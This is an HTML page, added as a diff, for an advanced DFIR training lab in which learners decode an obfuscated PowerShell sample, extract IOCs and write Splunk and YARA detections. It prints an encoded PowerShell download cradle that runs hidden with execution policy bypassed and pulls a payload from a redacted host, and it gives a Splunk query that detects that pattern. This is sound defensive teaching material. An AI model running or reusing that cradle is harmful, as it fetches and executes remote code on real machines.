@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Suspicious PowerShell Analysis Lab | shewag-secops</title>
+  <meta name="description" content="Analyze obfuscated PowerShell malware, decode payloads, and build detection rules. Advanced DFIR lab. Free download." />
+  <meta name="keywords" content="PowerShell malware analysis, DFIR lab, obfuscated PowerShell, living off the land, blue team" />
+  <link rel="canonical" href="https://shewag-secops.online/labs/suspicious-powershell.html" />
+  <meta property="og:title" content="Suspicious PowerShell Analysis Lab | shewag-secops" />
+  <meta property="og:url"   content="https://shewag-secops.online/labs/suspicious-powershell.html" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>" />
+  <link rel="stylesheet" href="../assets/css/main.css" />
+</head>
+<body>
+
+<div class="lab-hero">
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a><span>/</span>
+      <a href="../labs.html">Labs</a><span>/</span>
+      <span style="color:var(--text-secondary)">Suspicious PowerShell Analysis</span>
+    </div>
+    <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px">
+      <span class="badge badge-advanced">Advanced</span>
+      <span class="badge badge-tag">DFIR</span>
+      <span class="badge badge-tag">Malware</span>
+      <span class="badge badge-soc">PowerShell</span>
+    </div>
+    <h1 class="lab-title">Suspicious PowerShell Analysis</h1>
+    <div class="lab-meta-row">
+      <div class="meta-item"><span class="icon">⏱</span> 90–120 minutes</div>
+      <div class="meta-item"><span class="icon">🎯</span> Advanced</div>
+      <div class="meta-item"><span class="icon">📥</span> VirtualBox OVA</div>
+      <div class="meta-item"><span class="icon">🔧</span> FLARE VM, CyberChef, Splunk</div>
+    </div>
+    <p style="color:var(--text-secondary);max-width:620px;line-height:1.8;font-size:1rem">
+      A heavily obfuscated PowerShell script was found running on an endpoint. Decode it,
+      understand the attack chain, extract IOCs, and build detections that would catch it next time.
+    </p>
+  </div>
+</div>
+
+<div class="container">
+  <div class="lab-content">
+    <div class="lab-main">
+
+      <div class="content-block">
+        <h2>🧪 Lab Description</h2>
+        <p>
+          This advanced DFIR lab gives you a real obfuscated PowerShell sample (safely defanged)
+          recovered from a compromised endpoint. You'll use static and dynamic analysis techniques
+          to decode the payload, map the attack to MITRE ATT&amp;CK, extract network IOCs, and
+          create both Splunk detection rules and YARA signatures.
+        </p>
+        <p>
+          The sample uses multiple layers of obfuscation including Base64 encoding, string
+          concatenation, and reflection — techniques commonly used by commodity malware and APT actors.
+        </p>
+      </div>
+
+      <div class="content-block">
+        <h2>🎯 Learning Objectives</h2>
+        <ul>
+          <li>Identify PowerShell obfuscation techniques (Base64, concatenation, reflection)</li>
+          <li>Use CyberChef to decode multi-layer obfuscated scripts</li>
+          <li>Perform safe dynamic analysis using FLARE VM sandbox</li>
+          <li>Extract network IOCs: C2 domains, IP addresses, user-agents</li>
+          <li>Map PowerShell TTPs to MITRE ATT&amp;CK (T1059.001, T1027, T1105)</li>
+          <li>Write a Splunk PowerShell detection rule (Script Block Logging)</li>
+          <li>Create a basic YARA rule for the decoded payload</li>
+        </ul>
+      </div>
+
+      <div class="content-block">
+        <h2>📋 Prerequisites</h2>
+        <ul>
+          <li>Completion of RDP Brute Force Detection lab</li>
+          <li>Basic PowerShell knowledge (not required but helpful)</li>
+          <li>Familiarity with Base64 encoding concepts</li>
+          <li>VirtualBox with 16GB RAM available (FLARE VM is resource-heavy)</li>
+          <li>Understanding of MITRE ATT&amp;CK framework</li>
+        </ul>
+      </div>
+
+      <div class="content-block">
+        <h2>📝 The Sample (Defanged)</h2>
+        <p>The following is the obfuscated PowerShell command recovered from endpoint memory:</p>
+        <div class="code-block">
+<span class="comment"># DO NOT RUN - Defanged sample for analysis only</span>
+pOwErSHeLl.EXE -NoP -NonI -W Hidden -Exec Bypass -Enc
+JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIA
+QwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIA
+aQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBbAFIARQBEAEEAQwBUAEUA
+RABdAC8AcABhAHkAbABvAGEAZAAnACkA...
+        </div>
+        <p>Your first task: decode this and identify what it's doing before running any further analysis.</p>
+      </div>
+
+      <div class="walkthrough">
+        <div class="walkthrough-header">
+          <h3>⚠ Walkthrough — Spoiler Alert</h3>
+          <span class="toggle">▼ Expand</span>
+        </div>
+        <div class="walkthrough-body">
+          <div class="warning-note">⚠ This is an advanced lab. Spend at least 30 minutes on your own before reading this.</div>
+          <p><strong style="color:var(--text-primary)">Step 1 — Initial Triage:</strong> The command-line flags are already telling: -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass. This is a classic malware invocation pattern (MITRE T1059.001).</p>
+          <p><strong style="color:var(--text-primary)">Step 2 — Decode Base64:</strong> Extract the -Enc value and decode in CyberChef using "From Base64" then "Decode text" (UTF-16LE). You'll get a WebClient download cradle.</p>
+          <p><strong style="color:var(--text-primary)">Step 3 — Extract IOCs:</strong> The decoded script downloads a second stage from a C2 URL. Extract: domain, URI path, User-Agent string. Submit domain to VirusTotal (in the lab you get a pre-canned VT report).</p>
+          <p><strong style="color:var(--text-primary)">Step 4 — Splunk Detection Rule:</strong></p>
+          <div class="code-block">index=wineventlog EventCode=4104
+| search ScriptBlockText="*-enc*" OR ScriptBlockText="*WebClient*" OR ScriptBlockText="*DownloadString*"
+| stats count by ComputerName, UserID, ScriptBlockText
+| where count > 1</div>
+          <p><strong style="color:var(--text-primary)">Step 5 — MITRE Mapping:</strong> T1059.001 (PowerShell), T1027 (Obfuscated Files), T1105 (Ingress Tool Transfer), T1071.001 (Web Protocols for C2).</p>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="lab-sidebar">
+      <div class="sidebar-card" style="border-color:var(--border-bright);background:linear-gradient(135deg,rgba(30,111,255,0.06),rgba(0,212,255,0.04))">
+        <h3 style="color:var(--cyan)">📥 Download Lab</h3>
+        <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:16px;line-height:1.6">
+          FLARE VM (Windows 10) + Splunk + CyberChef + defanged samples.
+        </p>
+        <div style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted);margin-bottom:16px">
+          <div>Size: ~5.8 GB</div>
+          <div>Format: OVA (VirtualBox 6.1+)</div>
+          <div>RAM: 8GB minimum</div>
+        </div>
+        <a href="#" class="btn btn-download" style="width:100%;justify-content:center;margin-bottom:10px">⬇ Download OVA</a>
+        <p style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);text-align:center">SHA256 checksum included</p>
+      </div>
+
+      <div class="sidebar-card">
+        <h3>🔧 Tools Required</h3>
+        <div class="tool-item"><span class="tool-icon">▸</span> VirtualBox 6.1+</div>
+        <div class="tool-item"><span class="tool-icon">▸</span> FLARE VM (pre-installed)</div>
+        <div class="tool-item"><span class="tool-icon">▸</span> CyberChef (pre-installed)</div>
+        <div class="tool-item"><span class="tool-icon">▸</span> Splunk Free (pre-installed)</div>
+        <div class="tool-item"><span class="tool-icon">▸</span> 8–16 GB RAM</div>
+      </div>
+
+      <div class="sidebar-card">
+        <h3>📚 References</h3>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank" rel="noopener" style="font-size:0.82rem;color:var(--cyan)">MITRE T1059.001 →</a>
+          <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener" style="font-size:0.82rem;color:var(--cyan)">MITRE T1027 →</a>
+          <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener" style="font-size:0.82rem;color:var(--cyan)">CyberChef Online →</a>
+        </div>
+      </div>
+
+      <div class="sidebar-card">
+        <h3>🔗 Related Labs</h3>
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <a href="soc-alert-triage.html" style="font-size:0.88rem;color:var(--text-secondary);display:flex;align-items:center;gap:8px;padding:8px;background:var(--bg-secondary);border-radius:6px;border:1px solid var(--border)">
+            <span style="color:var(--green)">●</span> SOC Alert Triage
+          </a>
+          <a href="rdp-brute-force.html" style="font-size:0.88rem;color:var(--text-secondary);display:flex;align-items:center;gap:8px;padding:8px;background:var(--bg-secondary);border-radius:6px;border:1px solid var(--border)">
+            <span style="color:var(--yellow)">●</span> RDP Brute Force Detection
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="../assets/js/components.js"></script>
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
